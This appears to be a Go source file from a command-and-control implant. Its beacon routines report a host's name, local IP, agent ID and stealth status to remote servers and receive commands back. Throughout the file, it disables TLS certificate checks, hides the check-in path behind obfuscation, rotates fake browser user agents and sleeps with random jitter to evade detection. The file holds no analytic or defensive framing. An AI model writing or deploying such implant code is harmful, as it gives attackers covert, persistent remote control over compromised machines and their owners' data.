package ttp

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"runtime"
	"sync"
	"time"

	"core/mon/internal/config"
	"core/mon/internal/obf"
	"core/mon/internal/protocol"
)

var (
	localIPOnce sync.Once
	localIPVal  string
)

func getLocalIP() string {
	localIPOnce.Do(func() {
		conn, err := net.Dial("udp", "8.8.8.8:53")
		if err != nil {
			return
		}
		defer conn.Close()
		if addr, ok := conn.LocalAddr().(*net.UDPAddr); ok {
			localIPVal = addr.IP.String()
		}
	})
	return localIPVal
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/110.0.0.0",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
}

// BeaconAny tries endpoints in order, returns command from first success.
func BeaconAny(endpoints []string, agentID string, lastTTP int, lastResult, lastError string, env *protocol.EnvReport) (*protocol.Command, string, error) {
	var lastErr error
	for _, ep := range endpoints {
		cmd, err := beacon(ep, agentID, lastTTP, lastResult, lastError, env)
		if err == nil {
			return cmd, ep, nil
		}
		lastErr = err
	}
	return nil, "", lastErr
}

// Beacon performs a single check-in. Kept for dispatch/aux compatibility.
func Beacon(serverAddr, agentID string, lastTTP int, lastResult, lastError string) (*protocol.Command, error) {
	cmd, _, err := BeaconAny([]string{serverAddr}, agentID, lastTTP, lastResult, lastError, nil)
	return cmd, err
}

func beacon(serverAddr, agentID string, lastTTP int, lastResult, lastError string, env *protocol.EnvReport) (*protocol.Command, error) {
	hostname, _ := os.Hostname()

	checkin := protocol.CheckIn{
		AgentID:       agentID,
		Hostname:      hostname,
		OS:            "windows",
		Arch:          runtime.GOARCH,
		UID:           0,
		LocalIP:       getLocalIP(),
		LastTTP:       lastTTP,
		LastResult:    lastResult,
		LastError:     lastError,
		Token:         protocol.GenerateToken(config.SharedSecret, agentID),
		Env:           env,
		StealthStatus: LocalStealthStatus(),
	}

	body, err := protocol.Encode(checkin)
	if err != nil {
		return nil, fmt.Errorf("encode: %w", err)
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	url := fmt.Sprintf("https://%s%s", serverAddr, obf.D(obf.CheckinPath))
	req, err := http.NewRequest("POST", url, bytes.NewReader(body))
	if err != nil {
		return nil, fmt.Errorf("new request: %w", err)
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Agent-ID", agentID)
	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("http post: %w", err)
	}
	defer resp.Body.Close()

	var buf bytes.Buffer
	_, _ = buf.ReadFrom(resp.Body)

	var cmd protocol.Command
	if err := protocol.Decode(buf.Bytes(), &cmd); err != nil {
		return nil, fmt.Errorf("decode response: %w", err)
	}
	return &cmd, nil
}

// JitteredSleep sleeps for interval +/- jitter*interval.
func JitteredSleep(interval time.Duration, jitter float64) {
	delta := time.Duration(float64(interval) * jitter * (2*rand.Float64() - 1))
	time.Sleep(interval + delta)
}
